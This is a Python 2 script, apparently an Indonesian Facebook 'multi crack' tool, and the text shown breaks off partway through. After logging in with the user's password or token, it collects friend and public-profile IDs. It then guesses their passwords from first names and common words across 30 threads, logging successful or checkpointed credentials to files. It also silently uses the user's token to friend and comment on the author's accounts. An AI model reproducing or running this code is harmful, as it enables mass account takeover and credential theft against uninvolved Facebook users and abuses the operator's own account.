#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 cek.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """ 
\x1b[1;97m======================================================
\x1b[1;91m======================================================
\x1b[1;97m================\x1b[1;91m TOOL MULTI CRACK WORD\x1b[1;97m ================
\x1b[1;91m    ___       ____     ______   ______   ______   ___
\x1b[1;92m   /   |     / __ \   / ____/  / ____/  / ____/  /   |
\x1b[1;93m  / /| |    / /_/ /  / / __   / __/    / /      / /| |
\x1b[1;94m / ___ |   / _, _/  / /_/ /  / /___   / /___   / ___ |
\x1b[1;95m/_/  |_|  /_/ |_|   \____/  /_____/   \____/  /_/  |_|
\x1b[1;96m============https://github.com/black-rosee============
\x1b[1;97m============== \x1b[1;91mDARI INDONESIA UNTUK DUNIA\x1b[1;97m =============
\x1b[1;91m======================================================
\x1b[1;97m======================================================"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
Succes = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo 
	print "\033[37;1m____________________________________"
	print "\033[37;1m[\033[32;1m01✓\033[37;1m]\033[37;1m Login Facebook With ID Or Email Facebook"
	print "\033[37;1m[\033[32;1m02✓\033[37;1m]\033[37;1m Login With Token Facebook"
	print "\033[37;1m[\033[32;1m00✓\033[37;1m]\033[37;1m Exit"
	print "\033[37;1m____________________________________"
	pilih_masuk()
	
def pilih_masuk():
	msuk = raw_input("\033[37;1m-> \033[91m:\033[1;92m ")
	if msuk =="":
		print"\033[37;1m[\033[32;1m!\033[37;1m] Fill in correctly"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		login()
	elif msuk =="2" or msuk =="02":
		token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[37;1m[\033[32;1m!\033[37;1m] Fill in correctly"
		pilih_masuk()
		
#####LOGIN_EMAIL#####
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n[!] Try again"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Success'
				os.system('xdg-open https://m.facebook.com/rvadxd.1')
				bot_komen()
			except requests.exceptions.ConnectionError:
				print"\n[!] Try Again"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Your Account Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password / Email Wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk() 
			
####LOGIN_TOKEN####
def token():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mToken : \033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Sukses'
		os.system('xdg-open https://m.facebook.com/rvadxd.1')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Wrong !"
		time.sleep(1.7)
		masuk()
	
######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;92m[!] Login Sukses"
		os.system('rm -rf login.txt')
	una = ('100005386548985')
	kom2 = ('HI Bro, Gw User Tools RVADXD')
	reac2 = ('Love')
	post2 = ('1472983012891236')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reaction?rype=' +reac2+ '&access_token=' + toket)
	menu()
			
######MENU######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Try Again"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;97m1.\x1b[1;93m Crack ID Indonesia"
	print "\x1b[1;97m2.\x1b[1;93m Crack All Country ( Buat Sandi )               "
	print "\x1b[1;97m3.\x1b[1;93m Information Friends Account             "
	print "\x1b[1;97m4.\x1b[1;93m Clone Yahoo               "
	print "\x1b[1;97m5.\x1b[1;93m Crack ID Bangladesh/Pakistan             "
	print "\n\x1b[1;91m0.\x1b[1;91m Logout            "
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
	elif unikers =="1":
		indo()
	elif unikers =="2":
		sandi()
	elif unikers =="3":
		informasi()
	elif unikers =="4":
		menu_yahoo()
	elif unikers =="5":
		bangla()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
		
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;93m01\033[1;97m]\033[1;96m->\033[1;97m Crack From ID Friendlist"
	print "\033[1;97m[\033[1;93m02\033[1;97m]\033[1;96m->\033[1;97m Crack From ID Public/Friends"
	print "\033[1;97m[\033[1;93m03\033[1;97m]\033[1;96m->\033[1;97m Crack From File"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Back"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print " \033[1;93m         🤡 \033[1;97mCRACK INDONESIA \033[1;93m🤡"
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		idt = raw_input("\033[1;97m{\033[1;93m+\033[1;97m} ID Public/Friends : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;93m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;93m!\033[1;97m] ID Public/Friends Nothing !"
			raw_input("\n[ Back ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Try Again !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Name File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File Nothing ! '
			raw_input('\n\033[1;92m[ \033[1;97mBack \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File Nothing  !'
			raw_input('\n\033[1;92m[ \033[1;97mBack \033[1;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;93m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;93m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;93m•\033[1;97m} Crack Walk "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[1;92m[Succes] ' + user + ' ❂ ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass1
					cek = open("out/ind1.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[1;92m[Succes] ' + user + ' • ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass2
							cek = open("out/ind1.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[1;92m[Succes] ' + user + ' • ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass3
									cek = open("out/ind1.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[1;92m[Succes] ' + user + ' • ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass4
											cek = open("out/ind1.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Anjing'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[1;92m[Succes] ' + user + ' • ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass5
													cek = open("out/ind1.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = c['first_name']+'321'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														print '\033[1;92m[Succes] ' + user + ' ❂ ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass6
															cek = open("out/ind1.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Bangsat'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																print '\033[1;92m[Succes] ' + user + ' • ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass7
																	cek = open("out/ind1.txt", "a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'Doraemon'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		print '\033[1;92m[Succes] ' + user + ' • ' + pass8
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass8
																			cek = open("out/ind1.txt", "a")
																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			pass9 = 'Bajingan'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			w = json.load(data)
																			if 'access_token' in w:
																				print '\033[1;92m[Succes] ' + user + ' • ' + pass9
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in w['error_msg']:
																					print '\033[1;93m[Checkpoint ×] ' + user + ' • ' + pass9
																					cek = open("out/ind1.txt", "a")
																					cek.write("ID:" +user+ " Pw:" +pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print '\033[1;97m[\033[1;93m✓\033[1;97m] \033[1;97mFinish ....'
	print"\033[1;97m[\033[1;93m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;93m!\033[1;97m] \033[1;97mCP file Saved : out/ind1.txt'
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	raw_input("\033[1;93m[\033[1;97m Back \033[1;93m]")
	os.system("python2 cek.py")

##########CRACK PASSWORD#######
def sandi():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;96m01\033[1;97m]\033[1;96m->\033[1;97m Crack From Friendlist "
	print "\033[1;97m[\033[1;96m02\033[1;97m]\033[1;96m->\033[1;97m Crack From ID Public/Friends"
	print "\033[1;97m[\033[1;96m03\033[1;97m]\033[1;96m->\033[1;97m Crack From File"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Back"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih_sandi()

def pilih_sandi():
	weak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if weak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_sandi()
	elif weak =="1" or weak =="01":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print "\033[1;93m       🤡  \033[1;97mBUAT LIST PASSWORD\033[1;93m  🤡"
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 3 : NamaDepan12345 ")
		sandi4 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Password 4 : ")
		sandi5 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Password 5 : ")
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif weak =="2" or weak =="02":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print "\033[1;93m       🤡  \033[1;97mCREATE LIST PASSWORD\033[1;93m  🤡"
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 3 : NamaDepan12345 ")
		sandi4 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Password 4 : ")
		sandi5 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Password 5 : ")
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		idt = raw_input("\033[1;97m{\033[1;96m+\033[1;97m} ID Public/Friends : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;96m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID public nothing!"
			raw_input("\n[ Back ]")
			sandi()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif weak =="3" or weak =="03":
		os.system('clear')
		print logo
		try:
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			print "\033[1;93m       🤡  \033[1;97mCREATE LIST PASSWORD\033[1;93m  🤡"
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 3 : NamaDepan12345 ")
			sandi4 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Password 4 : ")
			sandi5 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Password 5 : ")
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;96m?\033[1;97m} Name File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;91m[!] File tidak ada'
			raw_input('\n\033[1;92m[ \033[1;97mBack \033[1;92m]')
			sandi()
		except IOError:
			print '\033[1;91m[!] File tidak ada'
			raw_input('\n\033[1;92m[ \033[1;97mBack \033[1;92m]')
			sandi()
	elif weak =="0" or weak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;96m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;96m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;96m•\033[1;97m} Crack Walk "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
#####CRACK PASSWORD#####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			sandi1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[1;92m[Succes] ' + user + ' ❂ ' + sandi1
				oks.append(user+sandi1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;91m[Checkpoint ×] ' + user + ' ❂ ' + sandi1
					cek = open("out/world.txt", "a")
					cek.write("ID:" +user+ " Pw:" +sandi1+"\n")
					cek.close()
					cekpoint.append(user+sandi1)
				else:
					sandi2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[1;92m[Succes] ' + user + ' ❂ ' + sandi2
						oks.append(user+sandi2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;91m[Checkpoint ×] ' + user + ' ❂ ' + sandi2
							cek = open("out/world.txt", "a")
							cek.write("ID:" +user+ " Pw:" +sandi2+"\n")
							cek.close()
							cekpoint.append(user+sandi2)
						else:
							sandi3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[1;92m[Succes] ' + user + ' ❂ ' + sandi3
								oks.append(user+sandi3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;91m[Checkpoint ×] ' + user + ' ❂ ' + sandi3
									cek = open("out/world.txt", "a")
									cek.write("ID:" +user+ " Pw:" +sandi3+"\n")
									cek.close()
									cekpoint.append(user+sandi3)
								else:
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[1;92m[Succes] ' + user + ' ❂ ' + sandi4
										oks.append(user+sandi4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[1;91m[Checkpoint ×] ' + user + ' ❂ ' + sandi4
											cek = open("out/world.txt", "a")
											cek.write("ID:" +user+ " Pw:" +sandi4+"\n")
											cek.close()
											cekpoint.append(user+sandi4)
										else:
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[1;92m[Succes] ' + user + ' ❂ ' + sandi5
												oks.append(user+sandi5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[1;91m[Checkpoint ×] ' + user + ' ❂ ' + sandi5
													cek = open("out/world.txt", "a")
													cek.write("ID:" +user+ " Pw:" +sandi5+"\n")
													cek.close()
													cekpoint.append(user+sandi5)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
